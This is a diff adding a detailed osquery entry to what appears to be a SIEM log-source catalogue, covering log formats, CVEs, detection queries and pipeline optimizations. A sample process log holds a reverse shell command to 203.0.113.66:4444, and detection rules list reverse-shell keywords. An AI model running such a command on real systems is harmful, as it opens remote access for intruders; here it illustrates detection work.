@@ -2,9 +2,308 @@
 id: osquery
 name: osquery
 short: osquery
+aka:
+  - osqueryd
+  - osqueryi
+  - Fleet (osquery manager)
+  - Kolide
 vendor: osquery (Linux Foundation)
 category: edr
-status: stub
-summary: SQL-powered OS instrumentation; scheduled queries emit differential results as JSON.
+status: full
+updated: "2026-11-12"
+contributors:
+  - wlinde
+tags:
+  - endpoint
+  - telemetry
+  - sql
+  - open-source
+  - json
+  - linux
+  - macos
+  - windows
+summary: An open-source agent that exposes the operating system as SQL tables (processes, users, listening ports, packages, kernel modules, file hashes…). osqueryd runs scheduled queries and logs only what changed (differential results) or full snapshots as JSON, and can stream evented tables (process, socket, file events) — a building block for DIY EDR, compliance and asset inventory, usually managed by Fleet, Kolide or a commercial platform.
 sourcetypes:
   - st: osquery_results
+    desc: Scheduled-query results log (osqueryd.results.log) — differential and snapshot JSON
+  - st: osquery:results
+    desc: Splunk-style name for the same results JSON
+  - st: osqueryd.INFO
+    desc: Status log file (no official add-on sourcetype; osqueryd.INFO / WARNING / ERROR, Glog text or JSON via logger plugins)
+facts:
+  First released: 2014 (open-sourced by Facebook); Linux Foundation project since 2019
+  Platforms: Linux, macOS, Windows (FreeBSD community)
+  Components: osqueryd (daemon, scheduled queries), osqueryi (interactive shell), extensions
+  Management: Config + flagfile, or TLS remote config / distributed queries (Fleet, Kolide, commercial)
+  Logger plugins: filesystem (default), tls, syslog, windows_event_log, kinesis, firehose, kafka_producer
+  Log format: JSON per result row (differential "columns"+"action" or "snapshot" arrays); Glog status logs
+  Evented tables: process_events, socket_events, file_events (Linux audit / eBPF, macOS EndpointSecurity, Windows ETW)
+  Typical volume: Highly config-dependent — KB/host/day for inventory, MB/host/day with process events
+  Cribl Pack: None dedicated in the Dispensary
+placement:
+  slots:
+    - endpoint
+    - cloud
+    - internal
+  items:
+    - slot: endpoint
+      title: Laptops and workstations
+      desc: macOS and Windows fleets for compliance (disk encryption, OS patch level, browser extensions) and process telemetry.
+    - slot: cloud
+      title: Linux servers and cloud instances
+      desc: Baked into images for production servers and containers hosts; process/socket events via audit or eBPF give lightweight host visibility where a full EDR is too heavy.
+    - slot: internal
+      title: Fleet manager + log pipeline
+      desc: Fleet/Kolide (TLS) distributes packs and live queries; results stream to a log pipeline or SIEM through the tls, kinesis or kafka logger.
+howItWorks:
+  - title: The OS as a database
+    body: Hundreds of virtual tables (processes, users, crontab, authorized_keys, kernel_modules, listening_ports, deb_packages, chrome_extensions…) are generated on demand by the agent when a query reads them. SQLite is the query engine, so joins across tables work.
+  - title: Scheduled queries and packs
+    body: The schedule (grouped into packs) runs each query at its interval. Results are compared with the previous run stored in RocksDB, and only rows that were added or removed are logged — differential logging keeps volume low.
+  - title: Differential vs snapshot
+    body: Differential results emit one JSON object per changed row with "action":"added" / "removed" and the row in "columns". Snapshot queries emit the full result set in a "snapshot" array every interval — useful for inventory, expensive at scale.
+  - title: Evented tables
+    body: process_events, socket_events, file_events, user_events (and es_process_events on macOS) buffer OS events between query runs. Querying them drains the buffer, giving near-real-time process and network telemetry from Linux audit/eBPF, EndpointSecurity or ETW.
+  - title: Decorations and host identity
+    body: Decorators (always, load, interval) add host fields — hostname, UUID, username, OS version — to every result. hostIdentifier (hostname or UUID) identifies the endpoint; counter and epoch detect gaps and re-baselines.
+  - title: Watchdog
+    body: A watchdog process kills runaway workers or queries that exceed CPU/memory limits and denylists them, which shows up in the status log.
+traffic:
+  handles:
+    - Process execution and command lines
+    - Network sockets and listening ports
+    - File integrity (FIM) and hashes
+    - Users, groups, logins, SSH keys
+    - Installed packages and browser extensions
+    - Persistence locations (cron, launchd, services, startup items)
+  flow:
+    - step: Config load
+      desc: osqueryd reads the flagfile and config (local or TLS) with the schedule and packs.
+    - step: Event buffering
+      desc: Evented tables buffer OS events (audit, eBPF, EndpointSecurity, ETW).
+    - step: Scheduled query
+      desc: Query runs at its interval; virtual tables are generated.
+    - step: Diff
+      desc: Results compared with the last run in RocksDB; only changes kept.
+    - step: Decorate
+      desc: Host decorations, counter and epoch added.
+    - step: Log
+      desc: JSON written by the logger plugin(s) — file, TLS, syslog, Kinesis, Kafka.
+logs:
+  - type: Differential result (process_events)
+    sourcetype: osquery_results
+    format: json
+    share: 70–95 %
+    avg: ~900 B
+    desc: One object per added/removed row. Process events dominate volume when enabled and are the most valuable for detection.
+    key:
+      - name
+      - hostIdentifier
+      - action
+      - columns.path
+      - columns.cmdline
+      - columns.parent
+      - columns.uid
+      - columns.auid
+    noise:
+      - epoch
+      - counter
+      - numerics
+      - calendarTime
+      - decorations.host_uuid
+    sample: |-
+      {"name":"pack_ir_process_events","hostIdentifier":"web01.corp.example.com","calendarTime":"Thu Nov 12 09:14:22 2026 UTC","unixTime":1794557662,"epoch":0,"counter":4211,"numerics":false,"decorations":{"host_uuid":"4C4C4544-0035-3010-8052-B4C04F4E3732","hostname":"web01.corp.example.com"},"columns":{"pid":"28451","parent":"28440","path":"/usr/bin/bash","cmdline":"bash -c bash -i >& /dev/tcp/203.0.113.66/4444 0>&1","cwd":"/var/www/html","uid":"33","euid":"33","gid":"33","auid":"4294967295","time":"1794557661","syscall":"execve"},"action":"added"}
+  - type: Snapshot result
+    sourcetype: osquery_results
+    format: json
+    share: 5–25 %
+    avg: 2–50 KB
+    desc: Full result set every interval ("action":"snapshot"). Used for inventory and compliance; size grows with rows, so keep intervals long.
+    key:
+      - name
+      - hostIdentifier
+      - action
+      - snapshot[0].address
+      - snapshot[0].port
+      - snapshot[0].name
+    noise:
+      - epoch
+      - counter
+      - numerics
+    sample: |-
+      {"name":"pack_inventory_listening_ports","hostIdentifier":"web01.corp.example.com","calendarTime":"Thu Nov 12 09:15:00 2026 UTC","unixTime":1794557700,"epoch":0,"counter":96,"numerics":false,"action":"snapshot","snapshot":[{"pid":"1022","port":"22","address":"0.0.0.0","protocol":"6","name":"sshd","path":"/usr/sbin/sshd"},{"pid":"28451","port":"4444","address":"0.0.0.0","protocol":"6","name":"nc","path":"/tmp/.x/nc"}]}
+  - type: Status log
+    sourcetype: osqueryd.INFO
+    format: text
+    share: < 1 %
+    avg: ~150 B
+    desc: Glog status lines (I/W/E/F + date, thread, source file) — config errors, watchdog kills, denylisted queries, event-buffer drops. Tells you when telemetry is missing.
+    pattern: '^(?<severity>[IWEF])(?<date>\d{4}) (?<time>\d{2}:\d{2}:\d{2}\.\d{6})\s+(?<thread_id>\d+) (?<source_file>[^:\]]+):(?<line>\d+)\] (?<message>.*)$'
+    key:
+      - severity
+      - source_file
+      - message
+    noise:
+      - thread_id
+      - line
+    sample: |-
+      W1112 09:16:04.512233 28102 watcher.cpp:349] osqueryd worker (28140) stopping: Maximum sustainable CPU utilization limit exceeded for 12 seconds
+cves:
+  - id: CVE-2026-54000
+    cvss: 7
+    year: 2026
+    kev: false
+    scope: device
+    title: Windows processes-table heap overflow → local privilege escalation to SYSTEM (GHSA-4r78-6hg6-33gg; CNA CVSS 4.0 score, no NVD score)
+    affected: osquery ≤ 5.23.0 on Windows
+    fixed: 5.23.1
+    detect: osqueryd crashes/restarts in the status log and Windows Application log around a scheduled processes query; unexpected SYSTEM-level child processes of osqueryd.
+    avoid: Upgrade to 5.23.1; until then disable processes-table queries on Windows.
+  - id: CVE-2020-26273
+    cvss: 5.2
+    year: 2020
+    kev: false
+    scope: device
+    title: SQLite ATTACH lets an osquery admin read/write arbitrary SQLite files
+    affected: osquery before 4.6.0
+    fixed: 4.6.0
+    detect: Distributed/live queries or config containing ATTACH in Fleet audit logs; new .db files written by osqueryd.
+    avoid: Upgrade; restrict who can push live queries in the manager (Fleet RBAC).
+  - id: CVE-2024-3094
+    cvss: 10
+    year: 2024
+    kev: false
+    scope: traffic
+    title: xz/liblzma backdoor (sshd RCE) — supply-chain issue osquery helps find on Linux hosts
+    affected: xz-utils / liblzma 5.6.0 and 5.6.1
+    detect: deb_packages / rpm_packages snapshot rows with name xz-utils/liblzma5/xz-libs and version 5.6.0 or 5.6.1; process_events of sshd spawning unexpected children.
+    avoid: Downgrade/upgrade to a vendor-clean xz build; keep a package-inventory query in the schedule.
+  - id: CVE-2021-4034
+    cvss: 7.8
+    year: 2022
+    kev: true
+    scope: traffic
+    title: PwnKit — pkexec local privilege escalation on the Linux hosts osquery monitors
+    affected: polkit pkexec on most Linux distributions (2009–2022 builds)
+    detect: process_events with path /usr/bin/pkexec and empty cmdline / argc 0, uid != 0 and the child euid 0; GCONV_PATH in the environment.
+    avoid: Install the distro polkit update; interim chmod 0755 /usr/bin/pkexec (remove SUID).
+  - id: CVE-2024-6387
+    cvss: 8.1
+    year: 2024
+    kev: false
+    scope: traffic
+    title: regreSSHion — OpenSSH sshd signal-handler race (unauthenticated RCE on glibc Linux)
+    affected: OpenSSH 8.5p1 – 9.7p1 (and < 4.4p1)
+    fixed: OpenSSH 9.8p1 (or distro backports)
+    detect: Package inventory showing vulnerable openssh-server versions; floods of failed SSH connections (LoginGraceTime timeouts) in last/auth tables.
+    avoid: Patch; set LoginGraceTime 0 as a temporary mitigation; restrict SSH exposure.
+detections:
+  - title: Reverse shell or web-server spawning a shell
+    severity: critical
+    signals:
+      - name=process_events
+      - path bash/sh/python/nc
+      - cmdline contains /dev/tcp, -e /bin/sh, or socket
+      - uid of a service account (www-data 33)
+    why: A web server process starting an interactive shell to an external IP is a classic post-exploitation step.
+    kql: |-
+      dataset="osquery" action="added"
+      | where columns.cmdline has_any ("/dev/tcp/","nc -e","bash -i","socket.socket")
+      | project _time, hostIdentifier, columns.path, columns.cmdline, columns.uid, columns.parent
+    mitre:
+      - T1059.004
+      - T1505.003
+  - title: Unexpected listening port
+    severity: high
+    signals:
+      - listening_ports snapshot / diff
+      - port not in host baseline
+      - binary in /tmp or /dev/shm
+    why: Bind shells and implants open listeners; a binary in a world-writable path listening on a port is rarely legitimate.
+    kql: |-
+      dataset="osquery" name has "listening_ports"
+      | mv-expand s=snapshot
+      | where tostring(s.path) startswith "/tmp" or tostring(s.path) startswith "/dev/shm"
+      | project _time, hostIdentifier, tostring(s.port), tostring(s.path)
+    mitre:
+      - T1571
+      - T1059
+  - title: New SSH authorized key or crontab entry
+    severity: high
+    signals:
+      - name has authorized_keys / crontab
+      - action=added
+    why: Adding an SSH key or cron job is the cheapest Linux persistence; differential logging makes every addition an event.
+    kql: |-
+      dataset="osquery" action="added"
+      | where name has_any ("authorized_keys","crontab")
+      | project _time, hostIdentifier, name, columns
+    mitre:
+      - T1098.004
+      - T1053.003
+  - title: Kernel module loaded outside change window
+    severity: medium
+    signals:
+      - name has kernel_modules
+      - action=added
+      - module name not in baseline
+    why: Loadable kernel modules are used by rootkits to hide processes and files.
+    kql: |-
+      dataset="osquery" name has "kernel_modules" action="added"
+      | project _time, hostIdentifier, columns.name, columns.status
+    mitre:
+      - T1547.006
+      - T1014
+  - title: Telemetry gap (watchdog kills / events dropped)
+    severity: low
+    signals:
+      - severity W/E in status log
+      - watcher.cpp stopping / denylisted query
+      - counter gaps per host
+    why: An attacker who kills or starves osqueryd blinds the SOC; watchdog messages also mean queries need tuning.
+    kql: |-
+      dataset="osquery_status" severity in ("W","E")
+      | where message has_any ("stopping","denylist","dropped")
+      | summarize count() by host, source_file, bin(_time, 1h)
+    mitre:
+      - T1562.001
+optimizations:
+  - title: Explode snapshots into rows, drop unchanged inventory
+    saving: 30–60 %
+    fn: Unroll + Suppress
+    how: Snapshot arrays repeat identical inventory every interval. Unroll into one event per row, then suppress rows whose hash didn't change since the last interval (or switch the query to differential).
+    expr: "unroll snapshot → key: `${hostIdentifier}:${name}:${C.Crypto.md5(JSON.stringify(_row))}`  allow 1 / 24h"
+  - title: Drop envelope noise
+    saving: 10–20 %
+    fn: Eval
+    how: calendarTime duplicates unixTime; epoch, counter and numerics are only needed for gap analysis — keep counter in Lake, drop elsewhere. Flatten columns.* to top level.
+    expr: "remove: calendarTime, epoch, numerics, decorations.host_uuid"
+  - title: Filter benign process events
+    saving: 40–70 % of process_events
+    fn: Drop
+    how: Monitoring agents, package managers and cron-run scripts produce most process events. Drop known paths/parents from an allow-list lookup.
+    expr: name.includes('process_events') && C.Lookup('osq_benign.csv','path').match(columns.path)
+  - title: Route by query pack
+    saving: SIEM licence
+    fn: Routes
+    how: Security packs (process, socket, persistence) → SIEM; inventory/compliance packs → Lake or a CMDB destination.
+    expr: /^pack_(ir|security)_/.test(name) → SIEM  |  else → Lake
+references:
+  - title: osquery logging (results, differential and snapshot formats)
+    url: https://osquery.readthedocs.io/en/stable/deployment/logging/
+  - title: osquery process and socket auditing (evented tables)
+    url: https://osquery.readthedocs.io/en/stable/deployment/process-auditing/
+  - title: osquery security advisories
+    url: https://github.com/osquery/osquery/security/advisories
+  - title: GHSA-4r78-6hg6-33gg (CVE-2026-54000)
+    url: https://github.com/osquery/osquery/security/advisories/GHSA-4r78-6hg6-33gg
+  - title: NVD — CVE-2024-3094 (xz backdoor)
+    url: https://nvd.nist.gov/vuln/detail/CVE-2024-3094
+  - title: CISA Known Exploited Vulnerabilities catalog
+    url: https://www.cisa.gov/known-exploited-vulnerabilities-catalog
+related:
+  - cisco-nvm
+  - linux-auditd
+  - sysmon
+  - falco
+  - crowdstrike
